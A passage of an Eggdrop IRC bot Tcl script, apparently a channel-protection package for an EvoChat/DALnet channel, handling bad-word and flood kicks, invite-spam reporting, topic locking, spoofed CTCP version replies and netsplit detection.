    if {([string match "$badword*" $arg] || [string match "*$badword *" $arg] || [string match "* $badword*" $arg]) && ![isop $nick $chan]} {
      set bannick($nick) "$uhost"
      putserv "KICK $chan $nick :1badwo4rd1 match from 2$badword"
      return 1
    } }
  set isbad 0
  return 0
}
#proc set_-m {chan} {
  #if {[isutimer "set_-m $chan"]} { return 0 }
  #if {[botonchan $chan] && [botisop $chan] && [string match "*m*" [getchanmode $chan]]} { putserv "mode $chan -m" }
#}
bind topc - * topic_chk
proc topic_chk {nick uhost handle chan topic} {
  global botnick notc bannick
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $cflag I]} { return 0 }
  if {$nick == $botnick || $nick == "ChanServ" || [matchattr $nick f]} { return 0 }
  if {[matchattr $nick m]} { setuser $cflag XTRA "TOPIC" [topic $chan] ; saveuser ; return 0 }
  if {![isop $botnick $chan]} { return 0 }
  if {$topic == [getuser $cflag XTRA "TOPIC"]} { return 0 }
  if {![string match "*evochat.id*" $nick]} {
    set bannick($nick) "$uhost"
    putsrv "KICK $chan $nick :dont changing the topic!"
  }
  puthlp "topic $chan :[getuser $cflag XTRA "TOPIC"]"
  return 0
}
bind flud - * flood_chk
proc flood_chk {nick host handle type channel} {
  global notc botnick quick bannick notm flooddeop floodnick floodkick igflood kops owner
  putlog "FLOOD <<$type>> FRoM $host"
  if {[info exists bannick($nick)]} { return 1 }
  if {[info exists igflood($nick)]} { return 1 }
  if {[string match "*Serv*" $nick] || [matchattr $handle f] || $nick == $botnick} { putlog "FlooD <<$nick>> Service OR FrIeNd !PaSS!" ; return 1 }
  if {[string index $channel 0] != "#"} { foreach x [channels] { if {[onchan $nick $x]} { set channel $x } } }
  set mhost "@[lindex [split $host @] 1]"
  if {[string index $channel 0] == "#"} { if {![isop $botnick $channel]} { putlog "FlooD <<$nick>> BoT NoT $channel @P !IgNoREd!" ; return 1 } }
  set type [string tolower $type]
  if {$type == "join"} { set bannick($nick) "$mhost" ; putsrv "KICK $channel $nick :1exceed max 2join1 from 2$mhost" }
  if {$type == "ctcp"} {
    if {![info exists kops]} { if {[isop $nick $channel] || [isvoice $nick $channel]} { return 1 } }
    set bannick($nick) "$host"
    if {$quick == "1"} { putqck "KICK $channel $nick :1exceed max 2ctcp1 from 2$mhost" } else { putsrv "KICK $channel $nick :1exceed max 2ctcp1 from 2$mhost" }
  }
  if {$type == "pub"} {
    if {![info exists kops]} { if {[isop $nick $channel] || [isvoice $nick $channel]} { return 1 } }
    set bannick($nick) "$host"
    putsrv "KICK $channel $nick :1exceed max 2lines1 from 2$mhost"
    return 1
  }
  if {$type == "nick"} {
    if {![info exists kops]} { if {[isop $nick $channel] || [isvoice $nick $channel] || [string length $nick] == 8} { return 1 } }
    if {![info exists floodnick($mhost)]} {
      set floodnick($mhost) 1
      putsrv "KICK $channel $nick :stop changing your nick!"
      } {
      catch {unset floodnick($mhost)}
      set bannick($nick) "$host"
      putsrv "KICK $channel $nick :1twice exceed 2nick1 from 2$mhost"
    } }
  if {$type == "deop"} {
    if {![info exists flooddeop($nick)]} {
      set flooddeop($nick) 1
      putserv "KICK $channel $nick :1exceed max 2de@p1 from 2$mhost"
      } {
      catch {unset flooddeop($nick)}
      set bannick($nick) "$host"
      putserv "KICK $channel $nick :1twice exceed max 2de@p1 from 2$mhost"
    } }
  if {$type == "kick"} {
    if {![info exists floodkick($nick)]} {
      set floodkick($nick) 1
      putserv "KICK $channel $nick :1exceed max 2kick1 from 2$mhost"
      } {
      catch {unset floodkick($nick)}
      set bannick($nick) "$host"
      putserv "KICK $channel $nick :1twice exceed max 2kick1 from 2$mhost"
    } }
  return 1
}
bind raw - INVITE raw_chk
proc raw_chk {nick keyword arg} {
  global invme joinme notc bannick notd botnick
  set who [string range $nick 0 [expr [string first "!" $nick]-1]]
  set channel [lindex $arg 1]
  set channel [string range $channel 1 end]
  foreach x [channels] { if {[string tolower $channel] == [string tolower $x]} { putsrv "JOIN $channel" ; return 0 } }
  if {$who == "ChanServ" || [matchattr $who Z]} {
    if {![validchan $channel]} {
      if {[matchattr $who Z] && ![matchattr $who Q]} { puthlp "NOTICE $who :4DeNiEd..!" ; return 0 } else { set joinme $who }
      channel add $channel
      catch { channel set $channel -split +echox +trojan +dontkickops -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
      savechan
    }
    putsrv "JOIN $channel"
    return 0
  }
  if {[matchattr $who f]} { return 0 }
  foreach x [channels] {
    if {[onchan $who $x]} {
      if {[isop $botnick $x]} {
        set banmask "*[string range $who [string first "!" $who] end]"
        set bannick($who) $banmask
        putsrv "KICK $x $who :i hate2 $channel 1inviter"
        } {
        putsrv "PRIVMSG $x :!inviter $who to 5[string trimleft $channel "#"]"
        foreach c [chanlist $x f] {
          if {[isop $c $x]} {
            set sendspam "!kick [zip "$x $who spam from 2[string range $nick [string first "@" $nick] end]4 $channel 1inviter 2-report by1 $botnick-"]"
			putsrv "PRIVMSG $c :$sendspam" ; putlog "RePORTED InVITING FRoM <<$who$x>> To #$c#"
      } } } } {
      set banmask "[string range $nick [string first "@" $nick] end]"
      	  if {$banmask != "*!*@*" && $banmask != "*"} {
        foreach c [chanlist $x] {
          set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
          if {$banmask == $nickhost} {
            if {[matchattr $c f]} { continue }
            if {$c != $botnick} {
              if {[isop $botnick $x]} {
                set bannick($c) $banmask ; putsrv "KICK $x $c :4!1relay4!1 invite from 2$banmask 1to2 $channel"
                } { foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $c 4!1relay4!1 invite from 2$banmask 1to2 $channel 1-report by2 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } } 
				} } } } } }
  set invme([string range $nick [string first "@" $nick] end]) "inviter" ; return 0
}
bind ctcp - CLIENTINFO sl_ctcp
bind ctcp - USERINFO sl_ctcp
bind ctcp - FINGER sl_ctcp
bind ctcp - ERRMSG sl_ctcp
bind ctcp - ECHO sl_ctcp
bind ctcp - INVITE sl_ctcp
bind ctcp - WHOAMI sl_ctcp
bind ctcp - OP sl_ctcp
bind ctcp - OPS sl_ctcp
bind ctcp - UNBAN sl_ctcp
bind ctcp - TIME sl_ctcp
#bind ctcp - VERSION sl_ctcp
bind ctcp - CHAT chat_ctcp
proc sl_ctcp {nick uhost hand dest key arg} {
  global botnick notc
  if {[matchattr $nick f] || $nick == $botnick} { return 1 }
  if {[string match "*evochat.id*" [string tolower $uhost]]} { putsrv "NOTICE $nick :\001VERSION mIRC v6.2 Khaled Mardam-Bey\001" } { set hostmask "${nick}!*@*" ; newignore $hostmask $botnick "*" 1 }
  return 1
}
proc chat_ctcp {nick uhost hand dest key arg} {
  global botnick notc
  putlog "blug"
  if {[matchattr $nick Z]} { return 0 }
  putlog "$nick dcc"
  puthlp "NOTICE $nick :1SoRRY, I DoNT KNoW YoU..!"
  newignore "${nick}!*@*" $botnick "*" 1 ; return 1
}
proc voiceq {chan nick} { utimer [expr 5 + [rand 15]] [list voiceprc $chan $nick] }
proc voiceprc {chan nick} { global botnick ; if {[isop $botnick $chan] && ![isvoice $nick $chan] && ![isop $nick $chan]} { putserv "MODE $chan +vvvvvv $nick" } }
proc advertise {chan nick} {
  if {[isutimer "advq $chan $nick"]} { return 0 }
  set cret 5
  foreach ct [utimers] { if {[string match "*advq*" $ct]} { if {[expr [lindex $ct 0] + 5] > $cret} { set cret [expr [lindex $ct 0] + 5] } } }
  utimer $cret [list advq $chan $nick]
}
proc advq {chan nick} {
  global notc
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![isop $nick $chan] && [onchan $nick $chan]} {
    set greetmsg [getuser $cflag XTRA "GREET"] ; regsub %n $greetmsg $nick greetmsg
    regsub %c $greetmsg $chan greetmsg ; puthlp "PRIVMSG $nick :$greetmsg"
  } }
proc deopprc {chan nick} { global botnick ; if {[isop $botnick $chan] && [isop $nick $chan]} { if {![string match "*k*" [getchanmode $chan]]} { putserv "MODE $chan -ko 6no.guest.@ps $nick" } { putserv "MODE $chan -o $nick" } } }
proc autokick {chan nick} {
  global bannick notc botnick
  if {[isop $botnick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan]} {
    set hostmask [getchanhost $nick $chan] ; set hostmask "*!*@[lindex [split $hostmask @] 1]"
    set bannick($nick) $hostmask ; putsrv "KICK $chan $nick :1channel is under construction!"
  } }
proc opq {chan nick} { utimer [expr 7 + [rand 15]] [list opprc $chan $nick] }
proc opprc {chan nick} { global botnick unop ; if {[isop $botnick $chan] && ![isop $nick $chan] && ![info exists unop($nick)]} { putserv "MODE $chan +oooooo $nick" } }
bind raw - 301 rtn
proc rtn { from keyword arg } {
global notd botnick notb notc bannick
set nick [lindex $arg 1]
if {[matchattr $nick f]} { return 0 }
if {$nick == $botnick} { return 0 }
set awaytext [string range [lrange $arg 2 end] 1 end]
set awaytext [string tolower [netext $awaytext]]
if {[string match "*#*" $awaytext] || [string match "*/j*" $awaytext] || [string match "*www.*" $awaytext] || [string match "*http://*" $awaytext]} {
  foreach x [channels] { set chksiton [string tolower $x] ; if {[string match "*$chksiton*" [string tolower $awaytext]]} { return 0 } }
  foreach x [channels] {
    if {[onchan $nick $x]} {
      if {[isop $botnick $x]} {
        set bannick($nick) "*!*[string range [getchanhost $nick $x] [string first "!" [getchanhost $nick $x]] end]"
        putsrv "KICK $x $nick :invite 2away 1msg"
        } { foreach c [chanlist $x f] { if {[isop $c $x]} { set sendspam "!kick [zip "$x $nick invite 2away 1msg 2-report by1 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } } }
		} } } }
bind time -  "*0 * * * *" chk_five
bind time -  "*6 * * * *" chk_five
proc chk_five {min h d m y} { global longer ; catch { remain } ; puthlp "AWAY :$longer" ; auto_ping "0" "0" "0" "0" "0" }
proc pub_log {nick uhost hand channel arg} { global notc ; if {[getuser "config" XTRA "LOGCHAN"]!=""} { puthlp "NOTICE $nick :Log [getuser "config" XTRA "LOGCHAN"]" } }
set nwo $owner
proc chk_limit {chan} {
  global notc botnick lst_limit
  if {![isop $botnick $chan]} { return 0 }
  if {![info exists lst_limit($chan)]} { set lst_limit($chan) 0 }
  set cflag "c$chan" ; set cflag [string range $cflag 0 8]
  set usercount 0 ; foreach x [chanlist $chan] { incr usercount }
  set usercount [expr [getuser $cflag XTRA "LIMIT"] + $usercount]
  if {$lst_limit($chan) != $usercount} { set lst_limit($chan) $usercount ; putserv "MODE $chan +l $usercount" }
}
set quick "0"
proc chk_quick {} { global quick botnick ; putquick "PRIVMSG $botnick :\001PING [unixtime]\001" ; set quick "1" }
utimer 1 chk_quick
bind raw - MODE chk_op
proc chk_op {from keyword arg} {
  global botnick
  if {![string match "*+o*$botnick" $arg]} { return 0 }
  set chan [lindex $arg 0]
  if {[string match "*evochat.id*" $from] && [string match "ChanServ!*@*" $from]} {pub_resync $botnick "*" "*" $chan "*" ; return 0}
}
proc chk_on_op {channel} {
  global botnick kickme deopme invme virus_file virus_nick quick notc bannick is_m botname
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  if {[isutimer "chkspam $channel"]} { foreach x [utimers] { if {[string match "*chkspam $channel*" $x]} { killutimer [lindex $x 2] } } }
  if {[isutimer "GOP $channel"]} { return 0 }
  if {![onchan $botnick $channel]} { return 0 }
  utimer 20 [list putlog "GOP $channel"]
  set cinfo [channel info $channel]
  if {[string match "*+nodesynch*" $cinfo]} { pub_mdeop "*" "*" "*" $channel "" }
  set cmode [getchanmode $channel]
  if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
    if {[matchattr $cflag K]} {
      if {![string match "*[dezip [getuser $cflag XTRA "CI"]]*" [getchanmode $channel]]} { puthelp "mode $channel -k+k . [dezip [getuser $cflag XTRA "CI"]]" }
      } { if {[string match "*k*" $cmode]} { putserv "mode $channel -k 6r.e.l.e.a.s.e.d" } }
    #if {[string match "*R*" $cmode]} { puthelp "mode $channel -R" }
    #if {[string match "*m*" $cmode] && ![string match "*m*" [lindex [channel info $channel] 0]]} { putserv "mode $channel -m" }
    #if {[string match "*i*" $cmode]} { putserv "mode $channel -i" }
  }
  if {![string match "*m*" $cmode]} { foreach x [utimers] { if {[string match "*set_-m $channel*" $x]} { killutimer [lindex $x 2] } } }
  if {[matchattr $cflag I]} { if {[topic $channel] != [getuser $cflag XTRA "TOPIC"]} { puthlp "topic $channel :[getuser $cflag XTRA "TOPIC"]" } }
  foreach x [chanlist $channel] {
    if {$x == $deopme} {
      if {[isop $x $channel]} { if {![string match "*k*" $cmode]} { if {$quick == "1"} { putquick "mode $channel -ko 6de.@p.reverse $x" } else { putserv "mode $channel -ko 6de.@p.reverse $x" } } { if {$quick == "1"} { putquick "mode $channel -o $x" } else { putserv "mode $channel -o $x" } } }
      set deopme ""
    }
    set uhost "[getchanhost $x $channel]"
    set mhost "@[lindex [split [getchanhost $x $channel] @] 1]"
    if {[info exists kickme($x)]} {
      if {$kickme($x) == 3} {
        catch { unset kickme($x) }
        set bannick($x) "$uhost"
        if {$quick == "1"} { putqck "KICK $channel $x :1repeat 2kick, 1remote off, please.." } else { putsrv "KICK $channel $x :1repeat 2kick, 1remote off please.." }
        } {
        if {$kickme($x) == 1} { if {$quick == "1"} { putqck "KICK $channel $x :1self 2kick1 revenge" } { putsrv "KICK $channel $x :1self 2kick1 revenge" } }
      } }
    if {[string match "*+trojan*" $cinfo]} { set bmask_check $x!$uhost ; set bmask_host "*!*@[lindex [split $mhost @] 1]" ; trojanchk $x $bmask_check $bmask_host $channel }
    if {[string match "*+echox*" $cinfo]} { echoxchk $x $uhost * $channel }
    if {[string match "*+greet*" $cinfo]} { badnick_chk $x $uhost * $channel }
    if {[matchattr $cflag V]} {
      if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
        if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
          set cret [getuser $cflag XTRA "VC"]
          foreach ct [utimers] { if {[string match "*voiceq*" $ct]} { if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} { set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] } } }
          utimer $cret [list voiceq $channel $x]
        } } }
    if {[matchattr $x v] || [matchattr $x P] || [matchattr $x G]} { if {![isop $x $channel] || ![isvoice $x $channel]} { whoisq $x } }
    if {[matchattr $x O]} {
      if {[isop $x $channel]} {
        if {![string match "*k*" $cmode]} { puthelp "mode $channel -ko 6no@p.list $x" } { puthelp "mode $channel -o $x" }
        } { if {[isvoice $x $channel]} { if {![string match "*k*" $cmode]} { puthelp "mode $channel -kv 6no@p.list $x" } { puthelp "mode $channel -v $x" } } }
		}
    if {[info exists invme($mhost)]} {
      putlog "exist invme $x $invme($mhost) $channel chk_on_op"
      if {![isop $x $channel]} {
        set bannick($x) "$mhost"
        if {$invme($mhost) == "autojoin msg"} {
          if {![isvoice $x $channel]} { putsrv "KICK $channel $x :spam from 2$mhost 1$invme($mhost) - 2r1emote 2o1ff, please.." }
        } { putsrv "KICK $channel $x :spam from 2$mhost 1$invme($mhost)" }
      }
      catch {unset invme($mhost)}
    } }
  foreach x [chanlist $channel K] { if {![matchattr $x f]} { akick_chk $x [getchanhost $x $channel] $channel } }
  foreach x [chanbans $channel] {
    set bhost [lindex $x 0]
    if {[string match [string tolower $bhost] [string tolower $botname]]} {
      if {![string match "*k*" $cmode]} { puthelp "mode $channel -kb 6self.unban $bhost" } { puthelp "mode $channel -b $bhost" }
      } elseif {[matchattr $bhost f]} { puthelp "mode $channel -kb 6auto.unban $bhost"
      } elseif {[getuser "config" XTRA "IPG"] != ""} {
      foreach ipg [getuser "config" XTRA "IPG"] {
        if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
          if {![isutimer "IPG $bhost"]} {
            if {![string match "*k*" $cmode]} { puthelp "mode $channel -kb 1ip.gu4a1rd $bhost" } { puthelp "mode $channel -b $bhost" }
            utimer 60 [list putlog "IPG $bhost"]
} } } } } }
bind time -  "01 * * * *" chkonop
proc chkonop {min h d m y} { global botnick ; foreach x [channels] { if {[isop $botnick $x]} { chk_on_op $x } } }
bind time -  "09 09 * * *" show_status
proc show_status {min h d m y} { global botnick ; foreach x [channels] { if {[isop $botnick $x] && [string match "*+shared*" [channel info $x]]} { pub_status "*" "*" "*" $x "" } } }
proc badnick_chk {nick uhost hand chan} {
  global bannick notc botnick badwords
  foreach y [string tolower $badwords] {
    if {[string match "*$y*" [string tolower $nick]]} {
	foreach x [channels] {
        if {[onchan ${nick} $x]} {
          if {[botisop $x]} {
            set bannick($nick) "$uhost" ; putsrv "KICK $x ${nick} :1badni4ck1 match from 2$y"
            } else { foreach c [chanlist $x f] { if {[isop $c $x]} { set sendspam "!kick [zip "$x ${nick} 1badni4ck1 match from 2$y 1-report by2 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } } } 
			} } } }
return 0
}
proc akick_chk {nick uhost chan} {
  global notc bannick ; foreach x [getuser "AKICK" HOSTS] {
    if {[string match [string tolower $x] [string tolower "$nick!$uhost"]]} {
      set bannick($nick) $x ; putsrv "KICK $chan $nick :1blackli4st1 [kickmsg]"
} } }
proc isutimer {text} { set text [string tolower $text] ; foreach x [utimers] { set x [string tolower $x] ; if {[string match "*$text*" $x]} { return 1 ; break } } ; return 0 }
proc istimer {text} { set text [string tolower $text] ; foreach x [timers] { set x [string tolower $x] ; if {[string match "*$text*" $x]} { return 1 ; break } } ; return 0 }
##guard.tcl

## versions.tcl
set rv_style "squ"
## What users can use rvstyle command?
set rv_flag "n"
### Flood Protection Settings ###
## [0/1] Do you want to enable the flood protection?
# Note: This only protects your bot from ctcp-finger flood.
set rv_fludprot 1
## Answer how many ctcp-fingers in how many seconds?
set rv_maxctcps 1:10
## [0/1] Do you want to ignore the flooder?
set rv_ignore 1
## How long do you want to ignore the flooder (min)?
set rv_ignoretime 1
## The users with one of the following flags shouldn't be ignored.
# Note: Leave this empty if you want to ignore everybody.
set rv_flags "f"
### Misc Things ###
set rv_ver "2.00"
set rv_maxctcps [split $rv_maxctcps :]
set rv_style [string tolower $rv_style]
## mIRC versions.
set rv_desc(mirc) "mIRC"
set rv_versions(mirc) { "12,1 d7,1o11,1r8,1k3,1o13,1r12,1o " }
## irssi versions.
set rv_desc(irssi) "irssi"
set rv_versions(irssi) { "12,1 d7,1o11,1r8,1k3,1o13,1r12,1o " }
## BitchX versions.
set rv_desc(bitchx) "BitchX"
set rv_versions(bitchx) { "12,1 d7,1o11,1r8,1k3,1o13,1r12,1o " }
## random versions.
set rv_desc(squ) "squ"
set rv_versions(squ) {
  "12,1 d7,1o11,1r8,1k3,1o13,1r12,1o "
}
### Bindings ###
bind ctcp - VERSION ctcp:rv_version
bind dcc $rv_flag rvstyle dcc:rv_rvstyle
### Procs ###
proc dcc:rv_rvstyle {hand idx arg} {
  global rv_style rv_desc rv_versions
  set style [lindex [split $arg] 0]
  putcmdlog "#$hand# rvstyle $arg"
  if { $style == "" } {
    putidx $idx "Currently using: $rv_desc($rv_style) versions"
    putidx $idx "To get help, type: rvstyle -help"
    } elseif { [string tolower $style] == "-help" } {
    putidx $idx "NAME     DESCRIPTION" ; putidx $idx "-------  ----------------"
    foreach name [array names rv_versions] { putidx $idx "[format "%-8s %s" $name "$rv_desc($name) versions"]" }
    putidx $idx "To change the version-reply list, type: rvstyle <name>"
    } elseif { [lsearch -exact [array names rv_versions] [string tolower $style]] == -1 } { putidx $idx "Version-reply list '$style' is invalid."
    } else { set rv_style [string tolower $style] ; putidx $idx "Version-reply list changed to: $rv_desc($rv_style) versions" } 
}
proc ctcp:rv_version {nick uhost hand dest key arg} {
  global rv_versions rv_style rv_fludprot rv_maxctcps rv_ignore rv_ignoretime rv_flags rv_flooded rv_ctcpcount botnick
  set hostmask "*!*[string range $uhost [string first "@" $uhost] end]"
  if {$rv_fludprot} {
    if {![info exists rv_ctcpcount]} { set rv_ctcpcount 0 }
    if {![info exists rv_flooded]} { set rv_flooded 0 }
    if {$rv_flooded} { return 1 }
    incr rv_ctcpcount
    utimer [lindex $rv_maxctcps 1] "incr rv_ctcpcount -1"
    if {$rv_ctcpcount > [lindex $rv_maxctcps 0]} {
      utimer [lindex $rv_maxctcps 1] "set rv_flooded 0"
      set rv_flooded 1
      putlog "randversion: Blocking ctcp-versions for [lindex $rv_maxctcps 1] seconds." 
      if {$rv_ignore} { 
        foreach flag $rv_flags { if {[matchattr $hand $flag]} { return 1 } }
        if {![isignore $hostmask]} { newignore $hostmask $botnick "ctcp-version flood" $rv_ignoretime ; putlog "randversion: Ignoring $hostmask for ctcp-version flood for $rv_ignoretime mins." }
		}
      return 1
    } }
  putserv "NOTICE $nick :\001VERSION [lindex $rv_versions($rv_style) [rand [llength $rv_versions($rv_style)]]]\001"
  return 1
}
proc rv_setversions {} {
  global rv_desc rv_versions rv_style
  set rv_desc(eggdrop) "Eggdrop"
  set rv_versions(eggdrop) ""
  for {set i 0} {$i <= 28} {incr i} { lappend rv_versions(eggdrop) "eggdrop v1.8.${i}" }
  for {set i 0} {$i <= 4} {incr i} { lappend rv_versions(eggdrop) "eggdrop v1.8.${i}" }
  set rv_desc(all) "All"
  set rv_versions(all) ""
  foreach name [array names rv_versions] { if {[string tolower $name] != "all"} { foreach version $rv_versions($name) { lappend rv_versions(all) $version } } }
  if {[lsearch -exact [array names rv_versions] $rv_style] == -1} { return 0 } else { return 1 }
}

## split
bind raw - QUIT netsplit:detect

proc netsplit:detect {from key arg} {
 global netsplit
 if {[info exists netsplit(detected)]} { return 0 }
 set arg [string trimleft [netext [split $arg]] :]
 if {[string equal "Quit:" [string range $arg 0 4]]} { return 0 }
 if {![regexp {^([[:alnum:][:punct:]]+)[[:space:]]([[:alnum:][:punct:]]+)$} $arg _arg server1 server2]} { return 0 }
 if {[string equal ".evochat.id" [string range $server1 end-7 end]] && [string equal ".evochat.id" [string range $server2 end-7 end]]} {
  set server1cut "[lindex [split $server1 .] 0]" ; set server2cut "[lindex [split $server2 .] 0]"
  foreach chan [channels] {
    if {[string match "*+split*" [channel info $chan]]} {
    set cmode [getchanmode $chan]
    if {[string match "*c*" $cmode]} { putquick "PRIVMSG $chan :split detected between: $server1cut <0> $server2cut" }  { putquick "PRIVMSG $chan :split detected between: \002$server1cut\002 <O> \002$server2cut\002" }
  } }
  set netsplit(detected) 1
  utimer 25 [list netsplit:unlock]
 }
}

proc netsplit:unlock {} {
 global netsplit
 if {[info exists netsplit(detected)]} { unset netsplit(detected) }
}

## split end
##### EvoChat SERVER #######
set servers {
  irc6.dal.net
}

###########################################
putlog "=================================="
putlog "sQu TCL Loaded                    "
putlog "Reported any bugs to #mp3         "
putlog "Email: si@bayo.cool               "
putlog "=================================="
###########################################
